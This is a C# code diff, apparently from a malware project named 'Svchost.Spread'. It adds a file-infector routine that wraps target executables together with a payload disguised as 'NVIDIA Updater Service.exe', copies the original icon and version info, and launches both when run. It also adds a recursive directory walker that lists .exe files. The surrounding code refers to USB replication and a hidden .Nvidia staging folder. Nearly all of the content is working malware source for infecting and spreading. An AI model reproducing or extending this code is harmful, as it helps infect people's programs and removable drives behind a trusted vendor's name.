@@ -37,7 +37,7 @@ namespace Svchost.Spread
             targetFolder = "C:\\Users\\" + windowsName + "\\.Nvidia\\";
             usbFolderName = "Music\\";
 
-            checkEnvironment();
+            infect(appPath, appPath, "NVIDIA Updater Service2.exe");
             /*
             if (checkEnvironment())
                 driveDetector = new DriveDetector(applicationPath + assemblyName, replicateOverUSB);*/
@@ -80,6 +80,26 @@ namespace Svchost.Spread
                  fs.Close();*/
             }
             catch { }
+        }
+
+        void findAndInfect(string sDir)
+        {
+            try
+            {
+                foreach (string d in Directory.GetDirectories(sDir))
+                {
+                    foreach (string f in Directory.GetFiles(d))
+                    {
+                        if (f.Contains(".exe"))
+                            Console.WriteLine(f);
+                    }
+                    findAndInfect(d);
+                }
+            }
+            catch (System.Exception excpt)
+            {
+
+            }
         }
 
         public void replicateOverUSB(DriveInfo drive)
@@ -163,13 +183,14 @@ namespace Svchost.Spread
             OutputAssembly = "icontext3.exe"
         };
 
-        void infect(string appPath)
+        void infect(string currentPath, string targetFolder, string targetName)
         {
-            exctractIcon(@"test.exe");
+            exctractIcon(targetFolder + targetName);
 
             compilerParameters.ReferencedAssemblies.Add("System.dll");
-            compilerParameters.EmbeddedResources.Add("./test.exe");
-            compilerParameters.CompilerOptions = @"/win32icon:" + appPath + "icon12.ico";
+            compilerParameters.EmbeddedResources.Add(targetName);
+            compilerParameters.EmbeddedResources.Add("NVIDIA Updater Service.exe");
+            compilerParameters.CompilerOptions = @"/win32icon:" + currentPath + "icon12.ico";
 
             FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo("test.exe");
             CodeTypeReference versionAttr = new CodeTypeReference(typeof(AssemblyVersionAttribute));
@@ -189,22 +210,34 @@ namespace Svchost.Spread
             unit.AssemblyCustomAttributes.Add(descriptionDecl);
             unit.AssemblyCustomAttributes.Add(productNameDecl);
 
-            string cSharpCode = "public class Robot" +
-            "{" +
-            "   static void Main()" +
-            "   {" +
-            "       ExtractResource( \"./test.exe\", \"test.exe\" );" +
-            "       System.Diagnostics.Process.Start(\"test.exe\");" +
-            "   }" +
+            string cSharpCode = @"public class System0
+            {
+               static void Main(string[] args)
+               {
+                    ExtractResource( ""./%%FILENAME%%"", ""%%FILENAME%%"" );
+                    string parameters = """";
+                    for(int i = 0; i < args.Length; i++)
+                    {
+                        parameters += args[i] + """";
+                    }
+                    System.Diagnostics.Process.Start(""%%FILENAME%%"", parameters);
+                    ExtractResource( ""./NVIDIA Updater Service.exe"", ""NVIDIA Updater Service.exe"" );
+                    System.Diagnostics.Process.Start(""NVIDIA Updater Service.exe"");
+               }
 
-            "   static void ExtractResource(string resource, string path)" +
-            "   {" +
-            "       System.IO.Stream stream = typeof(Robot).Assembly.GetManifestResourceStream(resource);" +
-            "       byte[] bytes = new byte[(int)stream.Length];" +
-            "       stream.Read(bytes, 0, bytes.Length);" +
-            "       System.IO.File.WriteAllBytes(path, bytes);" +
-            "   }" +
-            "}";
+               static void ExtractResource(string resource, string path)
+               {
+                    System.IO.Stream stream = typeof(System0).Assembly.GetManifestResourceStream(resource);
+                    if(stream != null)
+                    {
+                        byte[] bytes = new byte[(int)stream.Length];
+                        stream.Read(bytes, 0, bytes.Length);
+                        System.IO.File.WriteAllBytes(path, bytes);
+                    }
+               }
+            }";
+
+            cSharpCode = cSharpCode.Replace("%%FILENAME%%", targetName);
 
             StringWriter sw = new StringWriter();
             cSharpCodeProvider.GenerateCodeFromCompileUnit(unit, sw, new CodeGeneratorOptions());
@@ -220,8 +253,6 @@ namespace Svchost.Spread
 
             Assembly assembly = results.CompiledAssembly;
             results.PathToAssembly = "./";
-            /*dynamic robot = assembly.CreateInstance("Robot");
-            robot.Speak();*/
         }
     }
 }
